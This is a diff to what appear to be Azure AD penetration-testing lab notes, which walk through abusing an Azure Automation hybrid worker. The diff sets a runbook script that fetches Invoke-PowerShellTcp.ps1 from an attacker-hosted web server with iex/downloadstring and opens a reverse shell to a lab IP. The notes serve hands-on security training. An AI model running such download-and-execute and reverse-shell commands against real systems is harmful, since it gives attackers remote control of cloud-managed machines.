@@ -723,7 +723,8 @@ PS C:\AzAD\Tools> Get-AzAutomationHybridWorkerGroup -AutomationAccountName Hybri
 - We are going to Import a powershell script ```C:\AzAD\Tools\studentx.ps1``` as a PowerShell runbook. This script will download the Invoke-PowerShellTCP.ps1 reverse shell from your student VM (which we are hosting out of ```C:\xampp\htdocs```) and execute on the hybrid worker.
 - The script we will create to be imported as a runbook:
 ```
-iex (New-Object Net.Webclient).downloadstring("http://172.16.x.x:82/Invoke-PowerShellTcp.ps1") Power -Reverse -IPAddress 172.16.x.x -Port 4444
+iex (New-Object Net.Webclient).downloadstring("http://172.16.152.213:82/Invoke-PowerShellTcp.ps1")
+Power -Reverse -IPAddress 172.16.152.213 -Port 1234
 ```
 
 - Host the ```Invoke-PowerShellTCP.ps1``` by copying it to the ```C:\xampp\htdocs``` and starting Apache using xampp.
